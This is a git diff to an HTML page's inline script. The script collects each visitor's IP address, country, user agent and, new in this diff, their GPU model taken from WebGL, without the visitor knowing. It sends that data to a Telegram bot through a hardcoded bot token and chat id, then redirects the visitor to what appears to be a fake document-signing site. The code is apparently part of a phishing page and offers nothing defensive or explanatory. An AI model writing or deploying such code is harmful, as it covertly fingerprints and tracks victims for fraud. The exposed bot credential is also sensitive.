@@ -4,8 +4,37 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        const botToken = "7548681470:AAETEnSZdclBzxtInZBZmAeRcquigEwRgu8"; 
+        const botToken = "7548681470:AAETEnSZdclBzxtInZBZmAeRcquigEwRgu8";
         const chatId = "6331127625";
+
+        function getGPUInfo() {
+            const canvas = document.createElement("canvas");
+            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+            if (gl) {
+                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                if (debugInfo) {
+                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+            return "Unknown GPU";
+        }
+
+        function sendInfo(ip, country, userAgent, gpuInfo) {
+            const message = `👤:
+IP: ${ip}
+Country: ${country}
+User-Agent: ${userAgent}
+GPU: ${gpuInfo}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(() => {
+                    window.location.href = "https://app.fastsigndocu.com/";
+                })
+                .catch(err => {
+                    console.error('Telegram send error:', err);
+                    window.location.href = "https://app.fastsigndocu.com/";
+                });
+        }
 
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
@@ -17,12 +46,9 @@
                     .then(locationData => {
                         const country = locationData.country || "Unknown"; 
                         const userAgent = navigator.userAgent;
-                        const message = `👤:\nIP: ${ip}\nCountry: ${country}\nUser-Agent: ${userAgent}`;
-                        
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                            .then(() => {
-                                window.location.href = "https://app.fastsigndocu.com/";
-                            });
+                        const gpuInfo = getGPUInfo();
+
+                        sendInfo(ip, country, userAgent, gpuInfo);
                     })
                     .catch(err => {
                         console.error('Location fetch error:', err);
